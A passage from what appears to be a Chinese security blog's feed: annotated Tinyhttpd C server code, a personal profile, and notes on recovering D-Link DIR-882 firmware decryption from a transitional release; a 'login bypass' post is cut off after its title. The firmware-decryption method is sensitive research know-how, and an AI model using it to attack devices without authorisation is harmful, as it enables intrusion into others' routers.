client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 500 Internal Server Error\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;P&gt;Error prohibited CGI execution.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Print out an error message with perror() (for system errors; based</span><span class="hljs-comment"> * on value of errno, which indicates system call errors) and exit the</span><span class="hljs-comment"> * program indicating an error. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">error_die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *sc)</span>&#123;    perror(sc);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Execute a CGI script.  Will need to set environment variables as</span><span class="hljs-comment"> * appropriate.</span><span class="hljs-comment"> * Parameters: client socket descriptor</span><span class="hljs-comment"> *             path to the CGI script */</span><span class="hljs-comment">/**********************************************************************/</span> <span class="hljs-comment">// cgi用于动态网页的处理</span> <span class="hljs-comment">// execute_cgi函数创建了两个进程，子进程用于cgi文件的处理，父进程用于往socket读写数据</span><span class="hljs-type">void</span> <span class="hljs-title function_">execute_cgi</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *path,</span><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *method, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *query_string)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-type">int</span> cgi_output[<span class="hljs-number">2</span>];    <span class="hljs-type">int</span> cgi_input[<span class="hljs-number">2</span>];    <span class="hljs-type">pid_t</span> pid;    <span class="hljs-type">int</span> status;    <span class="hljs-type">int</span> i;    <span class="hljs-type">char</span> c;    <span class="hljs-type">int</span> numchars = <span class="hljs-number">1</span>;    <span class="hljs-type">int</span> content_length = <span class="hljs-number">-1</span>;    buf[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;A&#x27;</span>; buf[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;exec cgi\n&quot;</span>);    <span class="hljs-comment">//get方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf)) <span class="hljs-comment">/* read &amp; discard headers */</span>        &#123;             <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;get\n&quot;</span>);            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        &#125;    <span class="hljs-comment">//post方法</span>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">/*POST*/</span>    &#123;                numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))        &#123;            <span class="hljs-comment">// &quot;Content-Length:&quot;长度为15个字符，所以将前15个字符比较。 </span>            buf[<span class="hljs-number">15</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;            <span class="hljs-comment">// 如果是Content-Length，读取这个改字段转为整数</span>            <span class="hljs-keyword">if</span> (strcasecmp(buf, <span class="hljs-string">&quot;Content-Length:&quot;</span>) == <span class="hljs-number">0</span>)            &#123;                content_length = atoi(&amp;(buf[<span class="hljs-number">16</span>]));                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;lenght:%d\n&quot;</span>,content_length);            &#125;            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));        &#125;        <span class="hljs-comment">//无法处理的话，400错误</span>        <span class="hljs-keyword">if</span> (content_length == <span class="hljs-number">-1</span>) &#123;            bad_request(client);            <span class="hljs-keyword">return</span>;        &#125;    &#125;    <span class="hljs-keyword">else</span><span class="hljs-comment">/*HEAD or other*/</span>    &#123;    &#125;    <span class="hljs-comment">//创建管道</span>    <span class="hljs-comment">//子进程写管道</span>    <span class="hljs-keyword">if</span> (pipe(cgi_output) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">//服务错误500</span>        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//子进程写管道</span>    <span class="hljs-keyword">if</span> (pipe(cgi_input) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-comment">//服务错误500</span>        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//创建子进程</span>    <span class="hljs-keyword">if</span> ( (pid = fork()) &lt; <span class="hljs-number">0</span> ) &#123;        cannot_execute(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//响应成功</span>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-comment">// 这下面是另一个坑，进程通信。</span>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* child: CGI script */</span>    &#123;        <span class="hljs-type">char</span> meth_env[<span class="hljs-number">255</span>];        <span class="hljs-type">char</span> query_env[<span class="hljs-number">255</span>];        <span class="hljs-type">char</span> length_env[<span class="hljs-number">255</span>];        dup2(cgi_output[<span class="hljs-number">1</span>], STDOUT);        dup2(cgi_input[<span class="hljs-number">0</span>], STDIN);        close(cgi_output[<span class="hljs-number">0</span>]);        close(cgi_input[<span class="hljs-number">1</span>]);        <span class="hljs-built_in">sprintf</span>(meth_env, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, method);        putenv(meth_env);        <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>) &#123;            <span class="hljs-built_in">sprintf</span>(query_env, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, query_string);            putenv(query_env);        &#125;        <span class="hljs-keyword">else</span> &#123;   <span class="hljs-comment">/* POST */</span>            <span class="hljs-built_in">sprintf</span>(length_env, <span class="hljs-string">&quot;CONTENT_LENGTH=%d&quot;</span>, content_length);            putenv(length_env);        &#125;        execl(path, <span class="hljs-literal">NULL</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">/* parent */</span>        close(cgi_output[<span class="hljs-number">1</span>]);        close(cgi_input[<span class="hljs-number">0</span>]);        <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>)            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; content_length; i++) &#123;                recv(client, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                write(cgi_input[<span class="hljs-number">1</span>], &amp;c, <span class="hljs-number">1</span>);            &#125;        <span class="hljs-keyword">while</span> (read(cgi_output[<span class="hljs-number">0</span>], &amp;c, <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span>)            send(client, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);        close(cgi_output[<span class="hljs-number">0</span>]);        close(cgi_input[<span class="hljs-number">1</span>]);        waitpid(pid, &amp;status, <span class="hljs-number">0</span>);    &#125;&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Get a line from a socket, whether the line ends in a newline,</span><span class="hljs-comment"> * carriage return, or a CRLF combination.  Terminates the string read</span><span class="hljs-comment"> * with a null character.  If no newline indicator is found before the</span><span class="hljs-comment"> * end of the buffer, the string is terminated with a null.  If any of</span><span class="hljs-comment"> * the above three line terminators is read, the last character of the</span><span class="hljs-comment"> * string will be a linefeed and the string will be terminated with a</span><span class="hljs-comment"> * null character.</span><span class="hljs-comment"> * Parameters: the socket descriptor</span><span class="hljs-comment"> *             the buffer to save the data in</span><span class="hljs-comment"> *             the size of the buffer</span><span class="hljs-comment"> * Returns: the number of bytes stored (excluding null) */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//处理包，大概流程是循环读取每个字符</span><span class="hljs-comment">//如果回车符(\r)的后面不是换行符(\n)或者读取失败就把当前读取的字符置为换行，从而终止循环</span><span class="hljs-comment">//如果没有成功接收到字符，以 \n 结尾，结束循环</span><span class="hljs-comment">//最后以\n结尾</span><span class="hljs-type">int</span> <span class="hljs-title function_">get_line</span><span class="hljs-params">(<span class="hljs-type">int</span> sock, <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> size)</span>&#123;    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;    <span class="hljs-type">char</span> c = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-type">int</span> n;    <span class="hljs-comment">//</span>    <span class="hljs-keyword">while</span> ((i &lt; size - <span class="hljs-number">1</span>) &amp;&amp; (c != <span class="hljs-string">&#x27;\n&#x27;</span>))    &#123;        n = recv(sock, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)        &#123;            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\r&#x27;</span>)            &#123;                n = recv(sock, &amp;c, <span class="hljs-number">1</span>, MSG_PEEK);                <span class="hljs-comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span>                <span class="hljs-keyword">if</span> ((n &gt; <span class="hljs-number">0</span>) &amp;&amp; (c == <span class="hljs-string">&#x27;\n&#x27;</span>))                    recv(sock, &amp;c, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                <span class="hljs-keyword">else</span>                    c = <span class="hljs-string">&#x27;\n&#x27;</span>;            &#125;            buf[i] = c;            i++;        &#125;        <span class="hljs-keyword">else</span>            c = <span class="hljs-string">&#x27;\n&#x27;</span>;    &#125;    buf[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">return</span>(i);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Return the informational HTTP headers about a file. */</span><span class="hljs-comment">/* Parameters: the socket to print the headers on</span><span class="hljs-comment"> *             the name of the file */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//响应头</span><span class="hljs-type">void</span> <span class="hljs-title function_">headers</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    (<span class="hljs-type">void</span>)filename;  <span class="hljs-comment">/* could use filename to determine file type */</span>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">strcpy</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Give a client a 404 not found status message. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">not_found</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-comment">//将内容打印到缓存，并且发送出去</span>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 404 NOT FOUND\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;your request because the resource specified\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;is unavailable or nonexistent.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Send a regular file to the client.  Use headers, and report</span><span class="hljs-comment"> * errors to client if they occur.</span><span class="hljs-comment"> * Parameters: a pointer to a file structure produced from the socket</span><span class="hljs-comment"> *              file descriptor</span><span class="hljs-comment"> *             the name of the file to serve */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> client, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span>&#123;    FILE *resource = <span class="hljs-literal">NULL</span>;    <span class="hljs-type">int</span> numchars = <span class="hljs-number">1</span>;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    buf[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;A&#x27;</span>; buf[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))  <span class="hljs-comment">/* read &amp; discard headers */</span>        numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));    <span class="hljs-comment">//打开文件，判断是否有文件</span>    resource = fopen(filename, <span class="hljs-string">&quot;r&quot;</span>);    <span class="hljs-keyword">if</span> (resource == <span class="hljs-literal">NULL</span>)        not_found(client);    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-comment">//构造响应头给客户端</span>        headers(client, filename);        <span class="hljs-comment">//将文件内容发送给客户端</span>        cat(client, resource);    &#125;    fclose(resource);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* This function starts the process of listening for web connections</span><span class="hljs-comment"> * on a specified port.  If the port is 0, then dynamically allocate a</span><span class="hljs-comment"> * port and modify the original port variable to reflect the actual</span><span class="hljs-comment"> * port.</span><span class="hljs-comment"> * Parameters: pointer to variable containing the port to connect on</span><span class="hljs-comment"> * Returns: the socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">//初始化 httpd 服务，包括建立套接字，绑定端口，进行监听等。</span><span class="hljs-type">int</span> <span class="hljs-title function_">startup</span><span class="hljs-params">(u_short *port)</span>&#123;    <span class="hljs-type">int</span> httpd = <span class="hljs-number">0</span>;    <span class="hljs-type">int</span> on = <span class="hljs-number">1</span>;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">name</span>;</span>    <span class="hljs-comment">//正常的socket创建流程</span>    httpd = socket(PF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (httpd == <span class="hljs-number">-1</span>)        error_die(<span class="hljs-string">&quot;socket&quot;</span>);    <span class="hljs-built_in">memset</span>(&amp;name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(name));    name.sin_family = AF_INET;    name.sin_port = htons(*port);    name.sin_addr.s_addr = htonl(INADDR_ANY);    <span class="hljs-comment">//setsockopt()函数，用于任意类型、任意状态套接口的设置选项值 </span>    <span class="hljs-keyword">if</span> ((setsockopt(httpd, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="hljs-keyword">sizeof</span>(on))) &lt; <span class="hljs-number">0</span>)      &#123;          error_die(<span class="hljs-string">&quot;setsockopt failed&quot;</span>);    &#125;    <span class="hljs-comment">//绑定socket到端口，port等于0，系统会随机分配一个端口（bind函数里实现）</span>    <span class="hljs-keyword">if</span> (bind(httpd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;name, <span class="hljs-keyword">sizeof</span>(name)) &lt; <span class="hljs-number">0</span>)        error_die(<span class="hljs-string">&quot;bind&quot;</span>);    <span class="hljs-comment">// 这个if的作用是将自动分配的端口传给port</span>    <span class="hljs-keyword">if</span> (*port == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* if dynamically allocating a port */</span>    &#123;        <span class="hljs-type">socklen_t</span> namelen = <span class="hljs-keyword">sizeof</span>(name);          <span class="hljs-comment">// 获取socket绑定的地址信息</span>        <span class="hljs-keyword">if</span> (getsockname(httpd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;name, &amp;namelen) == <span class="hljs-number">-1</span>)            error_die(<span class="hljs-string">&quot;getsockname&quot;</span>);        *port = ntohs(name.sin_port);    &#125;    <span class="hljs-comment">//监听端口</span>    <span class="hljs-keyword">if</span> (listen(httpd, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>)        error_die(<span class="hljs-string">&quot;listen&quot;</span>);    <span class="hljs-keyword">return</span>(httpd);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that the requested web method has not been</span><span class="hljs-comment"> * implemented.</span><span class="hljs-comment"> * Parameter: the client socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">unimplemented</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 501 guan zhu jia ran, dun dun jie chan\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, SERVER_STRING);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-Type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method Not Implemented\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/TITLE&gt;&lt;/HEAD&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;BODY&gt;&lt;P&gt;if you watch this page, please follow JiaRan_Diana.\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;br/&gt;&lt;img src=&#x27;https://img2.baidu.com/it/u=2323296913,2613522307&amp;amp;fm=253&amp;amp;app=138&amp;amp;size=w931&amp;amp;n=0&amp;amp;f=JPEG&amp;amp;fmt=auto?sec=1658854800&amp;amp;t=7b90c5387e83fb57a89e051eccbb7eb9&#x27;&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span>);    send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;    <span class="hljs-type">int</span> server_sock = <span class="hljs-number">-1</span>; <span class="hljs-comment">//服务端套接字接口</span>    u_short port = <span class="hljs-number">4000</span>; <span class="hljs-comment">//端口</span>    <span class="hljs-type">int</span> client_sock = <span class="hljs-number">-1</span>;<span class="hljs-comment">//已连接套接字描述符，初始化为-1（客户端）</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_name</span>;</span>     <span class="hljs-type">socklen_t</span>  client_name_len = <span class="hljs-keyword">sizeof</span>(client_name);    <span class="hljs-type">pthread_t</span> newthread;        <span class="hljs-comment">//调用startup()函数，建立一个监听套接字，在对应的端口建立httpd服务</span>    server_sock = startup(&amp;port);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;httpd running on port %d\n&quot;</span>, port);    <span class="hljs-comment">//循环调用accept()函数来等待客户端的连接，accept()会议阻塞的方式运行</span>    <span class="hljs-comment">//有客户端链接后返回到client_sock，去创建新线程处理请求</span>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    &#123;        client_sock = accept(server_sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_name, &amp;client_name_len);        <span class="hljs-keyword">if</span> (client_sock == <span class="hljs-number">-1</span>)            error_die(<span class="hljs-string">&quot;accept&quot;</span>);        <span class="hljs-comment">//创建新线程用accept_request()函数处理新请求，同时将客户端socket作为参数传过去</span>        <span class="hljs-comment">/* accept_request(&amp;client_sock); */</span>        <span class="hljs-keyword">if</span> (pthread_create(&amp;newthread , <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> *)accept_request, (<span class="hljs-type">void</span> *)(<span class="hljs-type">intptr_t</span>)client_sock) != <span class="hljs-number">0</span>)            perror(<span class="hljs-string">&quot;pthread_create&quot;</span>);    &#125;    close(server_sock);    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于我</title>
    <link href="/article/9ff79b23.html"/>
    <url>/article/9ff79b23.html</url>
    
    <content type="html"><![CDATA[<p>我</p><p>p1yang</p><p>21（年轻人，不讲武德）</p><p>rewirte战队成员（感谢我的几位好哥哥带我）</p><p>万年单身狗（有喜爱狗狗的小姐姐可以考虑下）</p><p>一个网络安全爱好者（师傅们带带我）</p><p>菜鸡（这是真的）</p><p>二进制玩家（这玩意好难，好难，好难！！！）</p><p>android开发专业废物（我ui画的贼溜）</p><p>复制诗歌爱好者（致橡树我真的太喜欢了！！！）</p><p>初音厨（即使离婚了我也爱她）</p><p>”日常“番爱好者（没有未来的未来不是我想要的未来）</p><p>正在学画本子的渣渣（哎嘿嘿）</p><p>英雄联盟万年黑铁（我闪现撞墙贼溜）</p><p>爹一只会窝在后排打狙（十倍镜都打不到人）</p><p>csgo皮肤收藏家（就是买不起而已，rush B gogogo！）</p><p>这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。</p><p>这里就算一个新的开始吧。</p><p>最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。</p><p>qq：397712823</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八的唠叨话</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>路由器固件解密思路</title>
    <link href="/article/876237c8.html"/>
    <url>/article/876237c8.html</url>
    
    <content type="html"><![CDATA[<p>学习思路来源于zdi：<code>https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware</code></p><p>关于如何判断是否加密在另一篇文章有提到： <code>https://p1yang.github.io/2022/04/02/iot/iot学习感悟/</code></p><p>一般来说固件加密有三种情况：</p><ol><li>初始版本未加密，后续某个版本加密了 在加密与初始版本中间某个版本附带了解密程序</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427111553846.png" alt="image-20220427111553846"></p><p>​        获取中间版本，从中分析解密程序。</p><ol start="2"><li>老版有加密，后续更换加密方式，中间发布未加密的过渡版本固件</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427113725651.png" alt="image-20220427113725651"></p><p>​        与1类似，也是同样获取带有解密程序的过渡版本固件分析提取解密程序</p><ol start="3"><li>老版有加密，后续更换加密方式，中间更换了新的未加密的解密程序</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427114528196.png" alt="image-20220427114528196"></p><p>​        如果清楚早期加密方式，或者拥有早期解密程序，可以去分析更换解密程序的中间版本，来获取解密程序。</p><p>​        如果没有早期相关解密信息，则无法使用上面方式，更多是购买设备，从硬件直接提取未加密的固件。</p><p>​        理论上，可以使用二进制对比分析工具，来分析尝试提取复原解密程序。</p><p>这是选用了经典的Dlink-DIR882的固件进行分析：</p><p>ftp：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</a></p><p>从固件时间顺序往早期查验</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427115925211.png" alt="image-20220427115925211"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427120035013.png" alt="image-20220427120035013"></p><p>发现<code>DIR882A1_FW104B02_Middle_FW_Unencrypt.bin</code>就是我们所说的过渡版本。</p><p>提取，分析，我们要通过他来查找解密程序。</p><p>或者复现根据升级路径来查找。</p><p>这里比较幸运通过关键字查到在bin下的imgdecrypt，但我们不能确定他一定是正确的解密程序</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427143219538.png" alt="image-20220427143219538"></p><p>我们尝试执行他。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151046949.png" alt="image-20220427151046949"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151221942.png" alt="image-20220427151221942"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151356109.png" alt="image-20220427151356109"></p><p>跟上面对比，正确能够被识别出文件。</p><p>尝试将其他固件也都测试下</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427152259592.png" alt="image-20220427152259592"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427152314636.png" alt="image-20220427152314636"></p><p>上面是命名比较规范的一种，有些命名不规范可能需要去根据前端升级去寻找相应的功能。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>totolink后台登录绕过</title>
    <link href="/article/b3e9da69.html"/>
    <url>/article/b3e9da69.html</url>
    
